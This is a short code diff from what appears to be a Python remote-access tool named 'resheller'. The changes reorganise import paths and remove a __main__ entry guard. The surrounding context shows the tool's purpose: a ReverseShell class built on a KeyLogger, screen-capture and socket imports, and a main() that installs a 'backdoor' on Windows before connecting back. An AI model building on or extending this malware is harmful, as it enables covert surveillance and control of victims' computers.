@@ -4,17 +4,17 @@ from os import chdir, environ, path, remove, listdir, name
 from shutil import copyfile
 from socket import socket, AF_INET, SOCK_STREAM
 from subprocess import Popen, PIPE, call
-from sys import executable, exit
+from sys import executable
 from threading import Thread
 from time import sleep
 
 from mss import mss
 from requests import get
-from resheller.src.client.ip import get_ip
 
-from resheller.src.client.keylogger import KeyLogger
-from resheller.src.server.pipe import SafeSocket
-from resheller.src.stdout.output import usage
+from resheller.client.ip import get_ip
+from resheller.client.keylogger import KeyLogger
+from lib.output import usage
+from lib.pipe import SafeSocket
 
 
 class ReverseShell(KeyLogger):
@@ -170,10 +170,3 @@ def main():
     if name == "nt":
         backdoor()
     ReverseShell().connect()
-
-
-if __name__ == '__main__':
-    try:
-        main()
-    except KeyboardInterrupt:
-        exit(0)
